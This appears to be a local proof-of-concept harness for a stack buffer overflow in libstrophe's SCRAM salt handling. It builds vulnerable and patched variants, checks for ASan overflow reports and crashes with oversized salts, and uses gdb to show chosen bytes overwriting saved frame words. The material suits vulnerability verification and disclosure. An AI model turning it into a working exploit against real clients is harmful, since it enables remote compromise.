#!/bin/sh
# Local-only libstrophe sasl_scram challenge reproduction and controls.
set -u
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$ROOT"
mkdir -p runs evidence
PASS=0
FAIL=0
ok()   { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf 'FAIL %s: %s\n' "$1" "$2"; }

check() {
    label=$1; shift
    if "$@"; then ok "$label"; else bad "$label" "check failed"; fi
}
contains() { grep -q -- "$2" "$1"; }
absent()   { ! grep -q -- "$2" "$1"; }

if sha256sum -c SHA256SUMS >runs/pin-check.out 2>&1; then
    ok 'immutable source, patch, advisory and harness pins'
else
    bad 'immutable pins' 'sha256sum -c SHA256SUMS failed'
fi

sh build-real.sh >runs/build.out 2>&1
if [ "$(grep -c BUILD_OK runs/build.out)" -eq 8 ]; then
    ok 'eight pinned consumer builds'
else
    bad 'builds' 'expected eight BUILD_OK lines'
fi

BINS_OK=0
for bin in runs/scram-vuln-asan runs/scram-vuln-plain \
           runs/scram-fixed-asan runs/scram-fixed-plain \
           runs/scram-vuln-noassert-asan runs/scram-vuln-noassert-plain \
           runs/scram-fixed-noassert-asan runs/scram-fixed-noassert-plain; do
    [ -x "$bin" ] && BINS_OK=$((BINS_OK+1))
done
if [ "$BINS_OK" -eq 8 ]; then
    ok 'eight rebuilt consumer binaries present'
else
    bad 'binary presence' "expected eight executables, found $BINS_OK"
fi

run_case() {
    bin=$1; n=$2; fill=$3
    out="evidence/$bin-$n-$fill.out"
    "$ROOT/runs/$bin" "$n" "$fill" >"$out" 2>&1
    RC=$?
}

# Stock NDEBUG builds: the project's STROPHE_ASSERTVD macro returns early.
run_case scram-vuln-asan 124 0x42
check 'stock vulnerable ASan 124 safe' test "$RC" -eq 0
check 'stock vulnerable ASan 124 response' contains evidence/scram-vuln-asan-124-0x42.out 'response=non-NULL'
check 'stock vulnerable ASan 124 no report' absent evidence/scram-vuln-asan-124-0x42.out 'AddressSanitizer'
for n in 125 256; do
    run_case scram-vuln-asan "$n" 0x42
    check "stock vulnerable ASan $n early-return negative" test "$RC" -eq 0
    check "stock vulnerable ASan $n no report" absent "evidence/scram-vuln-asan-$n-0x42.out" 'AddressSanitizer'
done
run_case scram-fixed-asan 125 0x42
check 'stock fixed ASan 125 rejects salt' test "$RC" -eq 0
check 'stock fixed ASan 125 NULL response' contains evidence/scram-fixed-asan-125-0x42.out 'response=NULL'

# Assert-disabled build: supported STROPHE_ASSERT/STROPHE_ASSERTVD override.
run_case scram-vuln-noassert-asan 124 0x42
check 'noassert vulnerable ASan 124 safe' test "$RC" -eq 0
check 'noassert vulnerable ASan 124 no report' absent evidence/scram-vuln-noassert-asan-124-0x42.out 'AddressSanitizer'
run_case scram-vuln-noassert-asan 125 0x42
check 'noassert vulnerable ASan 125 faults' test "$RC" -eq 1
check 'noassert vulnerable ASan 125 report' contains evidence/scram-vuln-noassert-asan-125-0x42.out 'AddressSanitizer'
check 'noassert vulnerable ASan 125 write size' contains evidence/scram-vuln-noassert-asan-125-0x42.out 'WRITE of size 4'
check 'noassert vulnerable ASan 125 sink line' contains evidence/scram-vuln-noassert-asan-125-0x42.out 'scram.c:188'
check 'noassert vulnerable ASan 125 real caller' contains evidence/scram-vuln-noassert-asan-125-0x42.out 'sasl_scram'
for n in 256 512; do
    run_case scram-vuln-noassert-asan "$n" 0x42
    check "noassert vulnerable ASan $n stack overflow" contains "evidence/scram-vuln-noassert-asan-$n-0x42.out" 'stack-buffer-overflow'
    check "noassert vulnerable ASan $n salt write" contains "evidence/scram-vuln-noassert-asan-$n-0x42.out" "WRITE of size $n"
    check "noassert vulnerable ASan $n sink line" contains "evidence/scram-vuln-noassert-asan-$n-0x42.out" 'scram.c:187'
    check "noassert vulnerable ASan $n real caller" contains "evidence/scram-vuln-noassert-asan-$n-0x42.out" 'sasl_scram'
    run_case scram-fixed-noassert-asan "$n" 0x42
    check "noassert fixed ASan $n clean" test "$RC" -eq 0
    check "noassert fixed ASan $n rejects" contains "evidence/scram-fixed-noassert-asan-$n-0x42.out" 'response=NULL'
    check "noassert fixed ASan $n no report" absent "evidence/scram-fixed-noassert-asan-$n-0x42.out" 'AddressSanitizer'
done

run_case scram-vuln-noassert-plain 124 0x42
check 'noassert vulnerable plain 124 survives' test "$RC" -eq 0
run_case scram-vuln-noassert-plain 125 0x42
check 'noassert vulnerable plain 125 survives' test "$RC" -eq 0
for n in 256 512; do
    run_case scram-vuln-noassert-plain "$n" 0x42
    check "noassert vulnerable plain $n SIGSEGV" test "$RC" -eq 139
done
for n in 125 256 512; do
    run_case scram-fixed-noassert-plain "$n" 0x42
    check "noassert fixed plain $n rejects cleanly" test "$RC" -eq 0
    check "noassert fixed plain $n NULL" contains "evidence/scram-fixed-noassert-plain-$n-0x42.out" 'response=NULL'
done

# Read-only debugger observation of chosen bytes beyond tmp[128].
gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'break scram.c:191' \
    -ex 'run 256 0x43' \
    -ex 'x/32bx tmp+120' \
    -ex 'bt 3' \
    ./runs/scram-vuln-noassert-plain >evidence/gdb-noassert-256.out 2>&1
check 'gdb reaches post-memcpy sink' contains evidence/gdb-noassert-256.out 'crypto_HMAC'
check 'gdb chosen bytes past tmp' contains evidence/gdb-noassert-256.out '0x43	0x43	0x43	0x43	0x43	0x43	0x43	0x43'
check 'gdb chosen saved frame words' contains evidence/gdb-noassert-256.out '0x4343434343434343'

{
    printf 'SUMMARY libstrophescram2shell\n'
    printf 'PASS=%s FAIL=%s\n' "$PASS" "$FAIL"
    printf 'ASAN_125_WRITE4=scram.c:188\n'
    printf 'ASAN_256_STACK_OVERFLOW=scram.c:187\n'
    printf 'PLAIN_256_RC=139\n'
    printf 'CHOSEN_FRAME=0x4343434343434343\n'
} >runs/summary.txt
cat runs/summary.txt
printf 'SUMMARY_SHA256 %s\n' "$(sha256sum runs/summary.txt | cut -d' ' -f1)"
[ "$FAIL" -eq 0 ] || exit 1
printf 'RUN_ALL_OK %s PASS / %s FAIL\n' "$PASS" "$FAIL"
